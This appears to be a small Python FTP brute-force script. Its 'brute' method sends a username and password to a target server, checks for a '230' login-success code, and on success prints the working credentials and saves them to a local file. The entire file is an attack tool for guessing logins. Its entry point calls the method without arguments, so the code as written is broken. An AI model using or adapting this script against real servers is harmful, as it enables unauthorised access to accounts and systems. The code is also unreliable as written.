import socket
import time



class FTP:
    '''
     FTP codes
     230 Login succesfull.
     530 User or password incorrect.
    '''

    def brute(ip, port, user, password):
        s = socket.create_connection((ip, port), source_address=None)


        u = ("USER " + user + "\r\n").encode()
        s.sendall(u)
        received1 = s.recv(1024).decode()
        

        p = ("PASS " + password + "\r\n").encode()
        s.sendall(p)
        received2 = s.recv(1024).decode()

                
        if "230" in received2:
    
            print("[*] Credentials Found")
            print("[*] " + "User: " + user + "/Password: " + password)
            file_ftp = open("credentials_ftp", "w") 
            file_ftp.write("User: " + user + " Password: " + password)
            file_ftp.close()
            quit()
    
        else:
            print("Incorrect User: " + user + ", Incorrect Password: " + password)
    
            
if __name__ == "__main__":
    FTP.brute()